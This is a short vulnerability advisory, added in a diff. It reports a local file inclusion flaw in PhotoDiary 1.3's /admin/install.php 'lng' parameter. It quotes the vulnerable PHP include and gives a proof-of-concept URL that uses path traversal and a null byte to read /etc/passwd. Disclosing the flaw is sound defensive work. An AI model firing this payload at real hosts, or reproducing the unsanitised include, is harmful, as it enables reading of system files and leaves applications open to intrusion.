@@ -1,0 +1,20 @@
+PhotoDiary 1.3 (lng) Local File Inclusion Vulnerability
+Discovered by cOndemned
+
+download: http://code.google.com/p/photodiary/
+
+
+source of /admin/install.php (lines 9 - 15):
+
+	if (isset($_GET['lng'])){
+		$LNG = $_GET['lng'];			# 1
+	} else {
+		$LNG = "ITA";
+	}
+	
+	include "../common/language_".$LNG.".php";	# 2
+
+
+proof of concept:
+		
+	http://[target_host]/admin/install.php?lng=/../../../../../../etc/passwd%00
